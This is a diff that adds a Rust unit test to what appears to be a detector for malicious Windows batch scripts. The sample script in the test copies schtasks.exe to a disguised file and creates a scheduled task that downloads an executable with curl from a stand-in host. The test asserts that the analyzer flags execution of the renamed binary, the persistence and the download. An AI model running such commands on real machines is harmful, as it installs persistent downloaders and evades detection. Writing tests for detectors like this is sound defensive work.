@@ -2356,6 +2356,45 @@ schtasks /create /tn "Updater" /tr "cmd /V:ON /c set U=https://schtasks.example/
     }
 
     #[test]
+    fn copied_schtasks_alias_create_tr_recurses_into_nested_download() {
+        let script = br#"copy C:\Windows\System32\schtasks.exe C:\Users\Public\st.tmp
+C:\Users\Public\st.tmp /create /tn "Updater" /tr "cmd /c curl -o out.exe https://copied-schtasks.example/p.exe" /sc once /st 00:00 /f
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target == r#"C:\Users\Public\st.tmp"#
+            )),
+            "copied schtasks alias did not emit manipulated execution: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { hive, key, command, .. }
+                    if hive == "ScheduledTask"
+                        && key == "Updater"
+                        && command == "cmd /c curl -o out.exe https://copied-schtasks.example/p.exe"
+            )),
+            "copied schtasks persistence missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-schtasks.example/p.exe"
+                        && dst.as_deref() == Some("out.exe")
+            )),
+            "copied schtasks nested action download missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn schtasks_change_tr_recurses_into_nested_download() {
         let script = br#"@echo off
 setlocal DisableDelayedExpansion
